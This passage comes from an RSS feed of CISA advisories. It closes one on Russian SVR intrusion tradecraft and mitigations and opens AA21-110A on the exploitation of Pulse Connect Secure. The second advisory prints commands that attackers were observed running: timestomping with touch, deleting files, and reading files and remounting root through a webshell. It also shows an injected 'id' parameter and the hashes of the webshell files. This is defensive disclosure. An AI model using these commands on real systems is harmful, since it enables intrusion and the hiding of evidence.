	&lt;li&gt;Prohibit remote access to administrative functions and resources from IP addresses and systems not owned by the organization.&lt;/li&gt;
	&lt;li&gt;Regular audits of mailbox settings, account permissions, and mail forwarding rules for evidence of unauthorized changes.&lt;/li&gt;
	&lt;li&gt;Where possible, enforce the use of strong passwords and prevent the use of easily guessed or commonly used passwords through technical means, especially for administrative accounts.&lt;/li&gt;
	&lt;li&gt;Regularly review the organization’s password management program.&lt;/li&gt;
	&lt;li&gt;Ensure the organization’s information technology (IT) support team has well-documented standard operating procedures for password resets of user account lockouts.&lt;/li&gt;
	&lt;li&gt;Maintain a regular cadence of security awareness training for all company employees.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;Leveraging Zero-Day Vulnerability&lt;/h3&gt;

&lt;p&gt;In a separate incident, SVR actors used CVE-2019-19781, a zero-day exploit at the time, against a virtual private network (VPN) appliance to obtain network access. Following exploitation of the device in a way that exposed user credentials, the actors identified and authenticated to systems on the network using the exposed credentials.&lt;/p&gt;

&lt;p&gt;The actors worked to establish a foothold on several different systems that were not configured to require multi-factor authentication and attempted to access web-based resources in specific areas of the network in line with information of interest to a foreign intelligence service.&lt;/p&gt;

&lt;p&gt;Following initial discovery, the victim attempted to evict the actors. However, the victim had not identified the initial point of access, and the actors used the same VPN appliance vulnerability to regain access. Eventually, the initial access point was identified, removed from the network, and the actors were evicted. As in the previous case, the actors used dedicated VPSs located in the same country as the victim, probably to make it appear that the network traffic was not anomalous with normal activity.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;Recommendations&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;To defend from this technique, the FBI and DHS recommend network defenders ensure endpoint monitoring solutions are configured to identify evidence of lateral movement within the network and:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Monitor the network for evidence of encoded PowerShell commands and execution of network scanning tools, such as NMAP.&lt;/li&gt;
	&lt;li&gt;Ensure host based anti-virus/endpoint monitoring solutions are enabled and set to alert if monitoring or reporting is disabled, or if communication is lost with a host agent for more than a reasonable amount of time.&lt;/li&gt;
	&lt;li&gt;Require use of multi-factor authentication to access internal systems.&lt;/li&gt;
	&lt;li&gt;Immediately configure newly-added systems to the network, including those used for testing or development work, to follow the organization’s security baseline and incorporate into enterprise monitoring tools.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;WELLMESS Malware&lt;/h3&gt;

&lt;p&gt;In 2020, the governments of the United Kingdom, Canada, and the United States attributed intrusions perpetrated using malware known as WELLMESS to APT 29. WELLMESS was written in the Go programming language, and the previously-identified activity appeared to focus on targeting COVID-19 vaccine development. The FBI’s investigation revealed that following initial compromise of a network—normally through an unpatched, publicly-known vulnerability—the actors deployed WELLMESS. Once on the network, the actors targeted each organization’s vaccine research repository and Active Directory servers. These intrusions, which mostly relied on targeting on-premises network resources, were a departure from historic tradecraft, and likely indicate new ways the actors are evolving in the virtual environment. More information about the specifics of the malware used in this intrusion have been previously released and are referenced in the ‘Resources’ section of this document.&lt;/p&gt;

&lt;h3&gt;Tradecraft Similarities of SolarWinds-enabled Intrusions&lt;/h3&gt;

&lt;p&gt;During the spring and summer of 2020, using modified SolarWinds network monitoring software as an initial intrusion vector, SVR cyber operators began to expand their access to numerous networks. The SVR’s modification and use of trusted SolarWinds products as an intrusion vector is also a notable departure from the SVR’s historic tradecraft.&lt;/p&gt;

&lt;p&gt;The FBI’s initial findings indicate similar post-infection tradecraft with other SVR-sponsored intrusions, including how the actors purchased and managed infrastructure used in the intrusions. After obtaining access to victim networks, SVR cyber actors moved through the networks to obtain access to e-mail accounts. Targeted accounts at multiple victim organizations included accounts associated with IT staff. The FBI suspects the actors monitored IT staff to collect useful information about the victim networks, determine if victims had detected the intrusions, and evade eviction actions.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;Recommendations&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Although defending a network from a compromise of trusted software is difficult, some organizations successfully detected and prevented follow-on exploitation activity from the initial malicious SolarWinds software. This was achieved using a variety of monitoring techniques including:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Auditing log files to identify attempts to access privileged certificates and creation of fake identify providers.&lt;/li&gt;
	&lt;li&gt;Deploying software to identify suspicious behavior on systems, including the execution of encoded PowerShell.&lt;/li&gt;
	&lt;li&gt;Deploying endpoint protection systems with the ability to monitor for behavioral indicators of compromise.&lt;/li&gt;
	&lt;li&gt;Using available public resources to identify credential abuse within cloud environments.&lt;/li&gt;
	&lt;li&gt;Configuring authentication mechanisms to confirm certain user activities on systems, including registering new devices.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;While few victim organizations were able to identify the initial access vector as SolarWinds software, some were able to correlate different alerts to identify unauthorized activity. The FBI and DHS believe those indicators, coupled with stronger network segmentation (particularly “zero trust” architectures or limited trust between identity providers) and log correlation, can enable network defenders to identify suspicious activity requiring additional investigation.&lt;/p&gt;

&lt;h3&gt;General Tradecraft Observations&lt;/h3&gt;

&lt;p&gt;SVR cyber operators are capable adversaries. In addition to the techniques described above, FBI investigations have revealed infrastructure used in the intrusions is frequently obtained using false identities and cryptocurrencies. VPS infrastructure is often procured from a network of VPS resellers. These false identities are usually supported by low reputation infrastructure including temporary e-mail accounts and temporary voice over internet protocol (VoIP) telephone numbers. While not exclusively used by SVR cyber actors, a number of SVR cyber personas use e-mail services hosted on cock[.]li or related domains.&lt;/p&gt;

&lt;p&gt;The FBI also notes SVR cyber operators have used open source or commercially available tools continuously, including Mimikatz—an open source credential-dumping too—and Cobalt Strike—a commercially available exploitation tool.&lt;/p&gt;
&lt;h3&gt;Mitigations&lt;/h3&gt;&lt;p&gt;The FBI and DHS recommend service providers strengthen their user validation and verification systems to prohibit misuse of their services.&lt;/p&gt;

&lt;h3&gt;Resources&lt;/h3&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;span style="font-size:11pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:Arial,sans-serif"&gt;&lt;span style="line-height:115%"&gt;NSA, CISA, FBI&amp;nbsp;&lt;a href="https://media.defense.gov/2021/Apr/15/2002621240/-1/-1/0/CSA_SVR_TARGETS_US_ALLIES_UOO13234021.PDF"&gt;Joint Cybersecurity Advisory:&amp;nbsp;Russian SVR Targets U.S. and Allied Networks&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
	&lt;li&gt;&lt;span style="font-size:11pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:Arial,sans-serif"&gt;&lt;span style="line-height:115%"&gt;CISA:&amp;nbsp;&lt;a href="https://us-cert.cisa.gov/remediating-apt-compromised-networks"&gt;Remediating Networks Affected by the SolarWinds and Active Directory/M365 Compromise&amp;nbsp;&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
	&lt;li&gt;&lt;span style="font-size:11pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:Arial,sans-serif"&gt;&lt;span style="line-height:115%"&gt;CISA&amp;nbsp;&lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa21-008a"&gt;Alert AA21-008A:&amp;nbsp;Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
	&lt;li&gt;&lt;span style="font-size:11pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:Arial,sans-serif"&gt;&lt;span style="line-height:115%"&gt;FBI, CISA, ODNI, NSA&amp;nbsp;Joint Statement: &lt;a href="https://www.odni.gov/index.php/newsroom/press-releases/press-releases-2021/item/2176-joint-statement-by-the-federal-bureau-of-investigation-fbi-the-cybersecurity-and-infrastructure-security-agency-cisa-the-office-of-the-director-of-national-intelligence-odni-and-the-national-security-agency-nsa"&gt;Joint Statement by the Federal Bureau of Investigation, the Cybersecurity and Infrastructure Security Agency, the Office of the Director of National Intelligence (ODNI), and the National Security Agency&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
	&lt;li&gt;&lt;span style="font-size:11pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:Arial,sans-serif"&gt;&lt;span style="line-height:115%"&gt;CISA&amp;nbsp;Alert &lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa20-352a"&gt;AA20-352A: Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
	&lt;li&gt;&lt;span style="font-size:11pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:Arial,sans-serif"&gt;&lt;span style="line-height:115%"&gt;&lt;a href="https://www.cisa.gov/sites/default/files/publications/CISA Insights - What Every Leader Needs to Know About the Ongoing APT Cyber Activity - FINAL_508.pdf"&gt;CISA Insights: What Every Leader Needs to Know about the Ongoing APT Cyber Activity&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
	&lt;li&gt;&lt;span style="font-size:11pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:Arial,sans-serif"&gt;&lt;span style="line-height:115%"&gt;FBI, CISA&amp;nbsp;&lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/AA20-336A-APT_Actors_Targeting_US_ThinkTanks.pdf"&gt;Joint Cybersecurity Advisory:&amp;nbsp;Advanced Persistent Threat Actors Targeting U.S. Think Tanks&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
	&lt;li&gt;&lt;span style="font-size:11pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:Arial,sans-serif"&gt;&lt;span style="line-height:115%"&gt;CISA:&amp;nbsp;&lt;a href="https://us-cert.cisa.gov/ncas/current-activity/2020/07/16/malicious-activity-targeting-covid-19-research-vaccine-development"&gt;Malicious Activity Targeting COVID-19 Research, Vaccine Development&amp;nbsp;&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
	&lt;li&gt;&lt;span style="font-size:11pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:Arial,sans-serif"&gt;&lt;span style="line-height:115%"&gt;NCSC, CSE, NSA, CISA&amp;nbsp;Advisory: &lt;a href="https://media.defense.gov/2020/Jul/16/2002457639/-1/-1/0/NCSC_APT29_ADVISORY-QUAD-OFFICIAL-20200709-1810.PDF"&gt;APT 29 targets COVID-19 vaccine development&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
            &lt;h3&gt;Revisions&lt;/h3&gt;
		&lt;ul&gt;			            &lt;li&gt;April 26, 2021: Initial Version&lt;/li&gt;		&lt;/ul&gt;
		&lt;hr /&gt;
            &lt;div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"&gt;&lt;p class="privacy-and-terms"&gt;This product is provided subject to this &lt;a href="https://us-cert.cisa.gov/privacy/notification"&gt;Notification&lt;/a&gt; and this &lt;a href="https://www.dhs.gov/privacy-policy"&gt;Privacy &amp;amp; Use&lt;/a&gt; policy.&lt;/p&gt;
&lt;/div&gt;
      </description>
  <pubDate>Mon, 26 Apr 2021 15:00:00 +0000</pubDate>
    <dc:creator>CISA</dc:creator>
    <guid isPermaLink="false">16499 at https://us-cert.cisa.gov</guid>
    </item>
<item>
	<title>AA21-110A: Exploitation of Pulse Connect Secure Vulnerabilities</title>
	<link>https://us-cert.cisa.gov/ncas/alerts/aa21-110a</link>
	<description>Original release date: April 20, 2021 | Last revised: May 28, 2021&lt;br/&gt;&lt;h3&gt;Summary&lt;/h3&gt;&lt;p&gt;The Cybersecurity and Infrastructure Security Agency (CISA) is aware of compromises affecting a number of U.S. government agencies, critical infrastructure entities, and other private sector organizations by a cyber threat actor—or actors—beginning in June 2020 or earlier related to vulnerabilities in certain Ivanti Pulse Connect Secure products. Since March 31, 2021, CISA and Ivanti have assisted multiple entities whose vulnerable Pulse Connect Secure products have been exploited by a cyber threat actor. These entities confirmed the malicious activity after running the &lt;a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755"&gt;Pulse Secure Connect Integrity Tool&lt;/a&gt;. To gain initial access, the threat actor is leveraging multiple vulnerabilities, including &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11510"&gt;CVE-2019-11510&lt;/a&gt;, &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8260"&gt;CVE-2020-8260&lt;/a&gt;, &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8243"&gt;CVE-2020-8243&lt;/a&gt;, and the newly disclosed &lt;a href="https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784/"&gt;CVE-2021-22893&lt;/a&gt;. The threat actor is using this access to place webshells on the Pulse Connect Secure appliance for further access and persistence. The known webshells allow for a variety of functions, including authentication bypass, multi-factor authentication bypass, password logging, and persistence through patching.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;(Updated May 3, 2021)&lt;/strong&gt;:&lt;/em&gt; Ivanti &amp;nbsp;has released &amp;nbsp;&lt;a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/SA44784/"&gt;Security Advisory SA44784&lt;/a&gt;&amp;nbsp;addressing &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22893"&gt;CVE-2021-22893&lt;/a&gt; and three additional newly disclosed CVEs—CVE-2021-22894, CVE-2021-22899, and CVE-2021-22900. CISA strongly encourages organizations using Ivanti Pulse Connect Secure appliances to immediately run the &lt;a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755"&gt;Pulse Secure Connect&amp;nbsp;Integrity&amp;nbsp;Tool&lt;/a&gt;, update to the &lt;a href="https://blog.pulsesecure.net/"&gt;latest software version&lt;/a&gt;, and investigate for malicious activity.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;(Updated May 27. 2021):&lt;/strong&gt;&lt;/em&gt; CISA has updated this alert to include new threat actor techniques, tactics, and procedures (TTPs), indicators of compromise (IOCs), and updated mitigations. See Ivanti &lt;a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755"&gt;KB44755 - Pulse Connect Secure (PCS) Integrity Assurance&lt;/a&gt; for updated guidance to&amp;nbsp;ensure the full integrity of your Pulse Connect Secure software.&lt;/p&gt;

&lt;p&gt;For a downloadable list of indicators of compromise (IOCs), see &lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/AA21-110A.xml"&gt;AA21-110A.stix&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Technical Details&lt;/h3&gt;&lt;p&gt;On March 31, 2021, Ivanti released the&amp;nbsp;&lt;a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755"&gt;Pulse Secure Connect Integrity Tool&lt;/a&gt; to detect the integrity of Pulse Connect Secure appliances. Their technical bulletin states:&lt;/p&gt;

&lt;div class="special_container"&gt;&lt;em&gt;We are aware of reports that a limited number of customers have identified unusual activity on their Pulse Connect Secure (PCS) appliances. The investigation to date shows ongoing attempts to exploit vulnerabilities outlined in two security advisories that were patched in 2019 and 2020 to address previously known issues: Security Advisory SA44101 (CVE-2019-11510) and Security Advisory SA44601 (CVE- 2020- 8260). For more information visit KB44764 (Customer FAQ).&lt;/em&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;(Updated May 27, 2021)&lt;/strong&gt;:&lt;/em&gt; CISA has observed the cyber threat actor performing cleanup as demonstrated by the following:&lt;/p&gt;

&lt;ol&gt;
	&lt;li&gt;Threat actor was observed timestomping trojanized umount binary to match timestamps of legitimate binaries attempting to disguise the modifications; the touch command was used to modify the time stamp https://attack.mitre.org/techniques/T1070/006/:&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; /bin/touch /tmp/data/root/bin/umount -r /tmp/data/root/bin/cp&lt;/p&gt;

&lt;p&gt;&amp;nbsp; &amp;nbsp; 2. The threat actor deleted files from temp directories using "rm -f":&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; /bin/rm -f tmp1&lt;br /&gt;
&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; /bin/rm -f tmp2&lt;/p&gt;

&lt;p&gt;&amp;nbsp; &amp;nbsp; 3.&amp;nbsp;Timestamps:&lt;/p&gt;

&lt;p&gt;&lt;o1&gt; &lt;strong&gt;Note: &lt;/strong&gt;for context, loop 6 is the active partition and loop 8 is the rollback partition of the device.&lt;/o1&gt;&lt;/p&gt;
&lt;o1&gt;
&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 600px; height: 312px; margin-left: auto; margin-right: auto;"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col"&gt;&lt;strong&gt;Date&amp;nbsp;&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 242px;"&gt;Time (GMT)&lt;/th&gt;
			&lt;th scope="col" style="width: 198px;"&gt;Partition&lt;/th&gt;
			&lt;th scope="col" style="width: 198px;"&gt;Artifact&lt;/th&gt;
			&lt;th scope="col" style="width: 198px;"&gt;Activity&amp;nbsp;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;4/13/21&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 242px;"&gt;5:15:33&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;pulse-loop6&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;/bin/umount&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;Content Modification Time&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;4/20/21&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 242px;"&gt;19:09:14&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;pulse-loop8&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;/bin/umount&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;Metadata Modification Time&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;4/20/21&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 242px;"&gt;19:09:14&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;pulse-loop8&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;/bin/umount&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;Content Modification Time&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;4/20/21&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 242px;"&gt;19:18:49&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;pulse-loop6&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;/bin/umount&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;Metadata Modification Time&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;4/23/21&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 242px;"&gt;16:14:48&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;pulse-loop6&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;/bin/umount&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;Last Access Time&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;5/6/21&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 242px;"&gt;14:27:20&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;pulse-loop8&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;/bin/umount&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;Last Access Time&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;4/20/21&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 242px;"&gt;19:08:01&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;pulse-loop6&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;/bin/touch&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;Last Access Time&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;4/20/21&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 242px;"&gt;19:09:14&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;pulse-loop8&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;/bin/touch&lt;/td&gt;
			&lt;td class="text-align-center" scope="col" style="width: 198px;"&gt;Last Access Time&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;
Security firm FireEye has posted more information on their blog, including activity related to actor clean up. See the FireEye blog post, &lt;a href="https://www.fireeye.com/blog/threat-research/2021/05/updates-on-chinese-apt-compromising-pulse-secure-vpn-devices.html"&gt;Re-Checking Your Pulse&lt;/a&gt;, for more information, including activity related to actor cleanup.&lt;/p&gt;

&lt;p&gt;The suspected cyber threat actor modified several legitimate Pulse Secure files on the impacted Pulse Connect Secure appliances. The modifications implemented a variety of webshell functionality:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;DSUpgrade.pm MD5&lt;/code&gt;: &lt;code&gt;4d5b410e1756072a701dfd3722951907&lt;/code&gt;

	&lt;ul&gt;
		&lt;li&gt;Runs arbitrary commands passed to it&lt;/li&gt;
		&lt;li&gt;Copies malicious code into &lt;code&gt;Licenseserverproto.cgi&lt;/code&gt;&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;Licenseserverproto.cgi MD5&lt;/code&gt;: &lt;code&gt;9b526db005ee8075912ca6572d69a5d6&lt;/code&gt;
	&lt;ul&gt;
		&lt;li&gt;Copies malicious logic to the new files during the patching process, allowing for persistence&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;Secid_canceltoken.cgi MD5&lt;/code&gt;: &lt;code&gt;f2beca612db26d771fe6ed7a87f48a5a&lt;/code&gt;
	&lt;ul&gt;
		&lt;li&gt;Runs arbitrary commands passed via &lt;code&gt;HTTP&lt;/code&gt; requests&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;compcheckresult.cgi MD5&lt;/code&gt;: &lt;code&gt;ca0175d86049fa7c796ea06b413857a3&lt;/code&gt;
	&lt;ul&gt;
		&lt;li&gt;Publicly-facing page to send arbitrary commands with &lt;code&gt;ID&lt;/code&gt; argument&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;Login.cgi MD5&lt;/code&gt;: &lt;code&gt;56e2a1566c7989612320f4ef1669e7d5&lt;/code&gt;
	&lt;ul&gt;
		&lt;li&gt;Allows for credential harvesting of authenticated users&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;Healthcheck.cgi MD5:&lt;/code&gt; &lt;code&gt;8c291ad2d50f3845788bc11b2f603b4a&lt;/code&gt;
	&lt;ul&gt;
		&lt;li&gt;Runs arbitrary commands passed via &lt;code&gt;HTTP&lt;/code&gt; requests&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Many of the threat actor’s early actions are logged in the Unauthenticated Requests Log as seen in the following format, URIs have been redacted to minimize access to webshells that may still be active:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Unauthenticated request url /dana-na/[redacted URI]?id=cat%20/home/webserver/htdocs/dana-na/[redacted URI] came from IP XX.XX.XX.XX.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The threat actor then ran the commands listed in table 1 via the webshell.&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Table 1: Commands run via webshell&lt;/em&gt;&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" height="330" style="margin-left: auto; margin-right: auto;" width="730"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col"&gt;&lt;strong&gt;Time &lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col"&gt;&lt;strong&gt;Command &lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col"&gt;2021-01-19T07:46:05.000+0000&lt;/td&gt;
			&lt;td scope="col"&gt;&lt;code&gt;pwd&lt;/code&gt;&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col"&gt;2021-01-19T07:46:24.000+0000&lt;/td&gt;
			&lt;td scope="col"&gt;&lt;code&gt;cat%20/home/webserver/htdocs/dana-na/[redacted]&lt;/code&gt;&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col"&gt;2021-01-19T08:10:13.000+0000&lt;/td&gt;
			&lt;td scope="col"&gt;&lt;code&gt;cat%20/home/webserver/htdocs/dana-na/l[redacted]&lt;/code&gt;&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col"&gt;2021-01-19T08:14:18.000+0000&lt;/td&gt;
			&lt;td scope="col"&gt;See Appendix.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col"&gt;2021-01-19T08:15:11.000+0000&lt;/td&gt;
			&lt;td scope="col"&gt;&lt;code&gt;cat%20/home/webserver/htdocs/dana-na/[redacted]&lt;/code&gt;&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col"&gt;2021-01-19T08:15:49.000+0000&lt;/td&gt;
			&lt;td scope="col"&gt;&lt;code&gt;cat%20/home/webserver/htdocs/dana-na/[redacted]&lt;/code&gt;&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col"&gt;2021-01-19T09:03:05.000+0000&lt;/td&gt;
			&lt;td scope="col"&gt;&lt;code&gt;cat%20/home/webserver/htdocs/dana-na/[redacted]&lt;/code&gt;&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col"&gt;2021-01-19T09:04:47.000+0000&lt;/td&gt;
			&lt;td scope="col"&gt;&lt;code&gt;$mount&lt;/code&gt;&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col"&gt;2021-01-19T09:05:13.000+0000&lt;/td&gt;
			&lt;td scope="col"&gt;&lt;code&gt;/bin/mount%20-o%20remount,rw%20/dev/root%20/&lt;/code&gt;&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col"&gt;2021-01-19T09:07:10.000+0000&lt;/td&gt;
			&lt;td scope="col"&gt;&lt;code&gt;$mount&lt;/code&gt;&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The cyber threat actor is using exploited devices located on residential IP space—including publicly facing Network Attached Storage (NAS) devices and small home business routers from multiple vendors—to proxy their connection to interact with the webshells they placed on these devices. These devices, which the threat actor is using to proxy the connection, correlate with the country of the victim and allow the actor activity to blend in with normal telework user activity.&amp;nbsp;&lt;b&gt;&lt;span style="font-size:11.0pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:&amp;quot;Arial&amp;quot;,sans-serif"&gt;Note:&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/b&gt;&lt;span style="font-size:11.0pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:&amp;quot;Arial&amp;quot;,sans-serif"&gt; these devices are not related to the Pulse vulnerabilities, but rather, where the malicious internet traffic passes through.&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Details about lateral movement and post-exploitation are still unknown at this time. CISA will update this alert as this information becomes available.&lt;/p&gt;

&lt;h3&gt;(Updated April 30, 2021): Detections&lt;/h3&gt;

&lt;h4&gt;&lt;em&gt;(Updated April 30, 2021): Impossible Travel&lt;/em&gt;&lt;/h4&gt;

